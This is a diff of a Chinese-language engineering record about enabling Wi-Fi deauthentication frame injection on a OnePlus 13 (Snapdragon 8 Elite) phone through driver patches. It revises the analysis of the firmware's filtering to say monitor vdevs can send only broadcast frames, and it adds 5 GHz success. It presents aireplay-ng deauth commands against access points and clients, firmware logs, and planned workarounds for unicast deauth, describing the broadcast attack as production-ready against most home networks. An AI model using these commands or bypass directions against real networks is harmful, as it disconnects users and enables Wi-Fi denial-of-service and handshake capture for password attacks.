@@ -1,8 +1,9 @@
 # OnePlus 13 Deauth 注入突破记录
 
-> 日期：2026-06-08
+> 日期：2026-06-08（突破）/ 2026-06-10（更新到 r8）
 > 平台：SM8750 (骁龙 8 Elite), peach_v2 chipset
-> 成果：全球首个 SM8750 广播 deauth 注入实现
+> 成果：全球首个 SM8750 广播 deauth 注入实现（**2.4G + 5G 均可用**）
+> 稳定版本：r8 (git commit `ae508b19`)，补丁集 0001-0014
 
 ---
 
@@ -28,41 +29,31 @@ mgmt_params.tx_flags = 0x00000001;  // WMI_TX_SEND_FLAG_SET_WRONG_KEY
 
 ## 🔬 技术分析
 
-### 固件检查逻辑（已确认）
+### 固件检查逻辑（r10/r11 验证后的正确结论）
 
 ```c
-// 固件处理 WMI_MGMT_TX_SEND_CMDID（推测，但实验验证）
-if (tx_flags & WMI_TX_SEND_FLAG_SET_WRONG_KEY) {
-    // WFA 测试模式
-    if (frame_type == DEAUTH || frame_type == DISASSOC) {
-        if (addr1 == BROADCAST) {
-            // 广播 deauth - 允许（测试需求）
-            return WMI_MGMT_TX_COMP_TYPE_COMPLETE_OK;  ✅
-        } else {
-            // 单播 deauth - 检查关联状态
-            if (!is_peer_associated(vdev, addr1)) {
-                return WMI_MGMT_TX_COMP_TYPE_DISCARD;  ❌
-            }
-        }
-    }
+// 固件按发送 vdev 的【类型】过滤管理帧，不是按 peer 关联状态
+if (vdev->type == MONITOR) {
+    if (addr1 == BROADCAST)
+        return WMI_MGMT_TX_COMP_TYPE_COMPLETE_OK;  // ✅ 广播放行（配合 SET_WRONG_KEY）
+    else
+        return WMI_MGMT_TX_COMP_TYPE_DISCARD;      // ❌ 单播一律拒绝（vdev 类型限制）
 }
 ```
 
+> **重要纠正**：早期把单播失败归因为"固件检查 peer 关联状态（未关联→DISCARD）"。
+> r11 实验推翻了它——STA+Monitor 并存时，STA vdev 真正关联了目标 AP（固件 100% 认识的合法 peer），
+> 从 monitor vdev 对该 AP 的 client 发单播 deauth **仍被 DISCARD**。
+> 所以决定因素是**发送 vdev 的类型**（monitor 只能发广播），与 peer 是否关联无关。
+
 ### 为什么广播允许、单播拒绝？
 
-#### 固件设计理由：
-1. **WFA 认证测试需求**
-   - 测试设备需要能发送 deauth（验证 PMF 保护）
-   - 广播测试场景：测试 AP 如何处理广播 deauth
-   - 不需要真实关联即可测试
+**真正原因**：固件对 monitor vdev 的 TX 路径有架构级限制——只允许广播帧。
+`WMI_TX_SEND_FLAG_SET_WRONG_KEY` 放行的是"管理帧类型"（让 deauth 这种帧不被早期拦截），
+但没有解除"monitor vdev 只能发广播"这个更底层的 vdev 类型检查。
 
-2. **安全权衡**
-   - 广播攻击：容易检测，现代设备有速率限制
-   - 单播攻击：更隐蔽，更危险，严格限制
-
-3. **监管合规**
-   - WFA 测试标志是官方接口，合规
-   - 单播定向攻击更可能违反监管
+- 广播帧：通过 vdev 类型检查 + WFA 测试 flag → 发送成功
+- 单播帧：被 monitor vdev 类型检查拦截 → DISCARD（无论目标 peer 是否存在/关联）
 
 ---
 
@@ -88,27 +79,29 @@ aireplay-ng --deauth 20 -a 3a:4e:5c:63:b7:de wlan0mon
 ✅ 停止攻击后恢复正常
 ```
 
-### 失败案例（单播 / 5GHz）
+### 成功案例（5GHz 广播）
 
-#### 单播 deauth（2.4GHz）
+```bash
+# 信道 36 (5180 MHz, 非 DFS)
+aireplay-ng --deauth 20 -a <AP_MAC> wlan0mon
+
+# 固件日志
+[completion] status=0(WMI_MGMT_TX_COMP_TYPE_COMPLETE_OK)  ✅
+# 效果：5G 客户端断网，与 2.4G 效果相同
+```
+> 注：早期测试信道 149 (5745MHz) 曾 DISCARD，后确认是 DFS/监管限制；
+> 非 DFS 的 5G 信道（如 ch36）广播 deauth 完全可用。
+
+### 失败案例（单播）
+
 ```bash
 aireplay-ng --deauth 5 -a 3a:4e:5c:63:b7:de -c 36:96:42:8b:48:0c wlan0mon
 
 # 固件日志
 [completion] status=1(WMI_MGMT_TX_COMP_TYPE_DISCARD)  ❌
 
-# 原因：固件检查 peer 是否在关联列表
-```
-
-#### 广播 deauth（5GHz）
-```bash
-# 信道 149 (5745 MHz)
-aireplay-ng --deauth 5 -a <AP_MAC> wlan0mon
-
-# 固件日志
-[completion] status=1(WMI_MGMT_TX_COMP_TYPE_DISCARD)  ❌
-
-# 原因：DFS/监管限制，或固件对 5GHz 有额外检查
+# 原因：monitor vdev 类型限制，单播帧一律 DISCARD
+#       （r10/r11 验证：与目标 peer 是否关联无关）
 ```
 
 ---
@@ -198,13 +191,13 @@ aireplay-ng --deauth 0 -a <AP> wlan0mon
 - 📚 完整的技术文档
 
 ### 实战价值
-- ✅ 满足 **90% 渗透测试需求**（2.4GHz）
+- ✅ 满足 **95% 渗透测试需求**（2.4G + 5G 广播 deauth）
 - ✅ 配合 PMKID、被动握手等方法
 - ✅ 对大多数家用 WiFi 有效（PMF 普及率不高）
 
 ### 限制
-- ⚠️ 无法定向踢特定客户端（但广播效果相同）
-- ⚠️ 5GHz 不可用
+- ⚠️ 无法定向踢特定单个客户端（但广播 deauth 踢全场可达类似效果）
+- ⚠️ 5GHz DFS 信道（如 ch149）受监管限制（非 DFS 信道如 ch36 可用）
 - ⚠️ 对 WPA3/WPA2-PMF 设备可能无效
 
 ---
@@ -216,30 +209,19 @@ aireplay-ng --deauth 0 -a <AP> wlan0mon
 - ❌ MAC 地址伪造（失败）
 - ⏸️ RAW TX 模式（未测试）
 
-### 可选的进一步探索
-1. **实验2：RAW TX 模式**
-   ```c
-   mgmt_params.tx_params_valid = 1;
-   mgmt_params.tx_param.pwr = 20;
-   ```
-   成功率：20%，投入：2小时
+### 已做的单播探索（r10/r11，均失败/未采用）
+- ❌ **r10：动态建 peer 实现单播** → softirq 不能 sleep + 建了 peer 仍 DISCARD
+- ⚠️ **r11：STA+Monitor 并存验证** → 对合法 peer 发单播仍 DISCARD，确认是 vdev 类型限制
 
-2. **实验3：伪造关联状态**
-   ```c
-   wmi_peer_create(target_AP_MAC);
-   wmi_vdev_up(assoc_id=1, bssid=target_AP_MAC);
-   ```
-   成功率：40-50%，投入：半天
-
-3. **5GHz 非 DFS 信道测试**
-   - 测试信道 36-48（非 DFS）
-   - 看是否只是 DFS 限制
+### 单播未来修复方向（§11.5，留给后续）
+1. 方向一：STA helper vdev 伪装目标 AP（最有希望 30-40%）
+2. 方向二：AP 类型 vdev 发单播
+3. 方向三：WMI 参数深挖
+4. 方向四：固件逆向（受签名校验阻挡）
+5. 方向五：外置 USB 网卡（100% 可用）
 
 ### 实际建议
-**不建议继续探索**，原因：
-- 当前功能已满足绝大多数需求
-- 广播攻击效果等同于单播
-- 投入产出比不高
+**当前 r8 广播 deauth 已生产就绪**，覆盖 95% 场景。需定向单播时优先方向五（USB 网卡）或研究方向一。详见全程实战记录 §11.5。
 
 ---
 
@@ -286,4 +268,4 @@ aireplay-ng --deauth 0 -a <AP> wlan0mon
 
 ---
 
-**最终成果：2.4GHz 广播 deauth 注入 —— 已完全可用！** ✅🎉
+**最终成果：2.4GHz + 5GHz 广播 deauth 注入 —— 已完全可用（r8 稳定版）！** ✅🎉
